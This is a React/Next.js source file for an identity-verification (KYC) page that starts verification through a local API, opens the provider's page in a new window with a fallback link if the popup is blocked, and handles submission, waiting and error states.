'use client';

import { useCallback, useEffect, useState } from 'react';
import { useSessionStore } from '@shared';
import { AlertCircle, Loader2, ExternalLink } from 'lucide-react';
import { BotGuard } from '@/components/security/BotGuard';
import { currentBrand } from '@/config/branding';

export default function KYCPage() {
  const { status, caseId, agentMessage } = useSessionStore();

  const [kycStatus, setKycStatus] = useState<'not_started' | 'in_progress' | 'waiting'>('not_started');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // Store KYC URL for fallback link if popup is blocked
  const [kycUrl, setKycUrl] = useState<string | null>(null);
  const [popupBlocked, setPopupBlocked] = useState(false);

  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setKycStatus('not_started');
      setError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsLoading(false);
    }
  }, [status, agentMessage]);

  async function handleBeginKYC() {
    if (!caseId) {
      setError('Session information missing');
      return;
    }

    try {
      const response = await fetch('/api/user-started-kyc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ case_id: caseId }),
      });

      if (!response.ok) {
        throw new Error('Failed to start KYC process');
      }

      const data = await response.json();
      const url = data.kyc_url;

      if (!url) {
        throw new Error('KYC provider is not configured properly');
      }

      // Store the URL for fallback
      setKycUrl(url);

      // Try to open popup
      const popup = window.open(url, '_blank');

      // Check if popup was blocked
      if (!popup || popup.closed || typeof popup.closed === 'undefined') {
        // Popup was blocked - show fallback link
        setPopupBlocked(true);
      }

      setKycStatus('in_progress');
      setError(null);
    } catch (err) {
      console.error('KYC begin error:', err);
      setError('Unable to start verification. Please try again.');
    }
  }

  async function handleKYCCompleted() {
    if (!caseId) {
      setError('Session information missing');
      return;
    }

    setIsLoading(true);
    setError(null);

    try {
      const response = await fetch('/api/submit-kyc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ case_id: caseId }),
      });

      if (!response.ok) {
        throw new Error('Failed to submit KYC');
      }

      setKycStatus('waiting');
      useSessionStore.setState({
        status: 'waiting',
        agentMessage: 'Waiting for review...',
      });
    } catch (err) {
      console.error('KYC completion error:', err);
      setError('Failed to submit. Please try again.');
      setIsLoading(false);
    }
  }

  const handleRetry = () => {
    setError(null);
    setKycStatus('not_started');
    setPopupBlocked(false);
    setKycUrl(null);
  };

  const isWaiting = kycStatus === 'waiting' || status === 'waiting' || isLoading;

  return (
    <BotGuard>
      <div className="login-card">
        <h1 className="card-heading">Identity Verification</h1>

        <div className="login-form">
          {/* Waiting State */}
          {isWaiting ? (
            <>
              <p style={{ textAlign: 'center', marginBottom: '24px' }}>
                Please wait while we verify your identity.
              </p>
              <button className="btn-login" disabled style={{ width: '100%' }}>
                <Loader2 className="h-4 w-4 animate-spin" style={{ marginRight: '8px', display: 'inline' }} />
                Verifying...
              </button>
            </>
          ) : (
            <>
              {kycStatus === 'not_started' && (
                <>
                  <p style={{ marginBottom: '16px', fontSize: '16px' }}>
                    To protect your account, we need to verify your identity.
                  </p>

                  <div className="form-group">
                    <label style={{ fontWeight: 600, display: 'block', marginBottom: '8px' }}>Have ready:</label>
                    <ul style={{ listStyleType: 'disc', paddingLeft: '24px', marginBottom: '8px' }}>
                      <li>A valid government-issued ID</li>
                      <li>A device with a camera</li>
                    </ul>
                  </div>

                  {error && (
                    <div className="form-group">
                      <div style={{ color: '#C20000', display: 'flex', alignItems: 'center', gap: '8px', fontSize: '14px' }}>
                        <AlertCircle className="h-4 w-4" />
                        <span>{error}</span>
                      </div>
                    </div>
                  )}

                  <div className="form-actions">
                    <button
                      type="button"
                      onClick={handleBeginKYC}
                      className="btn-login"
                      style={{ width: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center' }}
                    >
                      Begin Verification
                      <ExternalLink className="h-4 w-4" style={{ marginLeft: '8px' }} />
                    </button>
                  </div>

                  <p style={{ fontSize: '12px', marginTop: '16px', textAlign: 'center', color: '#666' }}>
                    Opens in a new window
                  </p>
                </>
              )}

              {kycStatus === 'in_progress' && (
                <>
                  {/* Popup blocked fallback */}
                  {popupBlocked && kycUrl && (
                    <div style={{ padding: '12px', backgroundColor: '#fff4e5', border: '1px solid #ffe0b2', borderRadius: '4px', marginBottom: '16px' }}>
                      <p style={{ marginBottom: '12px', fontSize: '14px' }}>
                        <strong>Pop-up blocked?</strong> Click the link below to open the verification page:
                      </p>
                      <a
                        href={kycUrl}
                        target="_blank"
                        rel="noopener noreferrer"
                        style={{ color: '#C20000', fontWeight: 600, display: 'flex', alignItems: 'center' }}
                        onClick={() => setPopupBlocked(false)}
                      >
                        Open Verification Page
                        <ExternalLink className="h-4 w-4" style={{ marginLeft: '6px' }} />
                      </a>
                    </div>
                  )}

                  <p style={{ marginBottom: '24px' }}>
                    Complete the verification in the new window, then click Continue.
                  </p>

                  {error && (
                    <div className="form-group">
                      <div style={{ color: '#C20000', display: 'flex', alignItems: 'center', gap: '8px', fontSize: '14px' }}>
                        <AlertCircle className="h-4 w-4" />
                        <span>{error}</span>
                      </div>
                    </div>
                  )}

                  <div className="form-actions" style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                    <button
                      type="button"
                      onClick={handleKYCCompleted}
                      className="btn-login"
                      disabled={isLoading}
                      style={{ width: '100%' }}
                    >
                      {isLoading && <Loader2 className="h-4 w-4 animate-spin" style={{ marginRight: '8px', display: 'inline' }} />}
                      {isLoading ? 'Submitting...' : 'Continue'}
                    </button>

                    <button
                      type="button"
                      onClick={handleRetry}
                      disabled={isLoading}
                      style={{
                        background: 'none',
                        border: 'none',
                        color: '#666',
                        textDecoration: 'underline',
                        cursor: 'pointer',
                        padding: '8px'
                      }}
                    >
                      Start over
                    </button>
                  </div>
                </>
              )}
            </>
          )}

          <div className="form-links" style={{ marginTop: '24px', borderTop: '1px solid #eee', paddingTop: '16px' }}>
            {/* Optional help text */}
          </div>
        </div>
      </div>
    </BotGuard>
  );
}
